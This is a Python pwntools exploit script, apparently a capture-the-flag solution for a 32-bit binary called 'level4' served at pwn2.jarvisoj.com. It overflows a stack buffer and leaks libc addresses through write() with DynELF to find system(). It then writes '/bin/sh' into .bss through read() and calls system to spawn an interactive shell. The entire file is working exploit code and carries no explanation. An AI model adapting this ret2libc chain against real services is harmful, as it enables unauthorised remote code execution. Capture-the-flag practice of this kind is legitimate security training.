#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./level4"
elf = context.binary
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./level4")
else:
    io = remote('pwn2.jarvisoj.com',9880)

def leak(addr):
    payload = flat(cyclic(0x88 + 4), elf.plt['write'], elf.sym['_start'], 1, addr, 4)
    io.send(payload)
    sleep(0.01)
    leaked = io.recv(4)
    info("leaked -> {}".format(leaked))
    return leaked

d = DynELF(leak, elf=ELF('./level4'))
system_addr = d.lookup('system', 'libc')
success("system -> {:#x}".format(system_addr))
pause()

#  gdb.attach(io)
payload = flat(cyclic(0x88 + 4), elf.sym['read'], elf.sym['_start'], 0, elf.bss() + 0x500, 8)
io.send(payload)
sleep(0.01)
io.send("/bin/sh\0")
sleep(0.01)

payload = flat(cyclic(0x88 + 4), system_addr, 'aaaa', elf.bss() + 0x500)
io.send(payload)

io.interactive()

